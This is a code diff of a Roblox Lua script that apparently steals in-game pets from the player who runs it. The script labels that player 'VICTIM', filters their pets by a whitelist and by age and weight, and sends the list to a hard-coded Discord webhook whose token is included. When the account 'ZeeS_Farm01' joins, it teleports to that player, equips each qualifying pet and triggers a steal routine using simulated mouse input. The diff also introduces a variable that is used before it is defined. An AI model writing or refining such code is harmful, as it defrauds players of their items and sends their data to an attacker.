@@ -4,7 +4,6 @@ until game:IsLoaded()
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1399110447600242819/Ln1Qds770unNt6fpn688JOjkOMYK9naSUB-hB4fbwf8mFagdzXJZlBks1fa6BI7gA7t_"
 local VICTIM = game.Players.LocalPlayer
-
 local USERNAMES = {
     "ZeeS_Farm01"
 }
@@ -24,29 +23,14 @@ local PET_WHITELIST = {
     'Brontosaurus',
     'Chicken Zombie',
     'Red Fox',
-    'Dilophosaurus'
+    'Dilophosaurus',
+    'Raiju'
 }
 
 local victimPetTable = {}
 
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
-
--- ▼ Условия для возраста и веса
-local MIN_AGE = 10
-local MIN_WEIGHT = 5
-
--- ▼ Проверка по имени, возрасту и весу
-local function checkPetsWhilelist(petData)
-    local petName = petData.PetType or ""
-    local petAge = petData.Age or 0
-    local petWeight = petData.Weight or 0
-
-    local nameMatch = table.find(PET_WHITELIST, petName)
-    local statMatch = petAge >= MIN_AGE and petWeight >= MIN_WEIGHT
-
-    return nameMatch or statMatch
-end
 
 local function waitForJoin()
     local findTarget = false
@@ -117,7 +101,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     }
 
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
-
+    
     local headers = {
         ["Content-Type"] = "application/json"
     }
@@ -135,6 +119,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     end
 end
 
+
 local function teleportTarget(targetName)
     VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
 end
@@ -142,13 +127,33 @@ end
 local function deltaBypass()
     VirtualInputManager:SendMouseButtonEvent(
         workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, true, nil, false
+        0,      
+        true,   
+        nil,    
+        false   
     )
+
     task.wait()
+
     VirtualInputManager:SendMouseButtonEvent(
         workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, false, nil, false
+        0,
+        false,
+        nil,
+        false
     )
+end
+
+function checkPetsWhilelist(petType, petObj)
+    for _, name in PET_WHITELIST do
+        if string.find(petType, name) then
+            local age = petObj and petObj:GetAttribute("Age") or 0
+            local weight = petObj and petObj:GetAttribute("Weight") or 0
+            if age >= 5 and weight >= 3 then
+                return true
+            end
+        end
+    end
 end
 
 local function getPetObject(petUid: string): Instance?
@@ -171,22 +176,28 @@ local function equipPet(pet)
     if pet:GetAttribute("d") then
         game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
     end
+
     VICTIM.Character.Humanoid:EquipTool(pet)
 end
 
--- ▼ ОБНОВЛЁННАЯ ФУНКЦИЯ
 local function getPlayersPets()
-    for petUid, petData in dataModule:GetData().PetsData.PetInventory.Data do
-        if not checkPetsWhilelist(petData) then
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if not checkPetsWhilelist(value.PetType, petObj) then
             continue
         end
 
-        local petName = petData.PetType or "Unknown"
-        local petAge = petData.Age or 0
-        local petWeight = petData.Weight or 0
 
-        local info = string.format("%s | %d дней | %.1f кг", petName, petAge, petWeight)
-        table.insert(victimPetTable, info)
+
+        local petObj = getPetObject(petUid)
+if petObj then
+    local age = petObj:GetAttribute("Age") or "?"
+    local weight = petObj:GetAttribute("Weight") or "?"
+    local line = string.format("%s [Age: %s] [Weight: %s KG]", value.PetType, age, weight)
+    table.insert(victimPetTable, line)
+else
+    table.insert(victimPetTable, value.PetType)
+end
+
     end
 end
 
@@ -199,15 +210,16 @@ end
 
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value) then
+        if not checkPetsWhilelist(value.PetType) then
             continue
         end
 
         local petObject = getPetObject(petUid)
+        
         if not petObject then
             continue
         end
-
+        
         equipPet(petObject)
         task.wait(0.2)
         startSteal(target)
@@ -218,6 +230,7 @@ local function idlingTarget()
     task.spawn(function()
         while task.wait(0.2) do
             local isTarget, trigerName = waitForJoin()
+
             if isTarget then
                 teleportTarget(trigerName)
                 checkPetsInventory(trigerName)
@@ -226,7 +239,6 @@ local function idlingTarget()
     end)
 end
 
--- Запуск
 getPlayersPets()
 
 task.spawn(function()
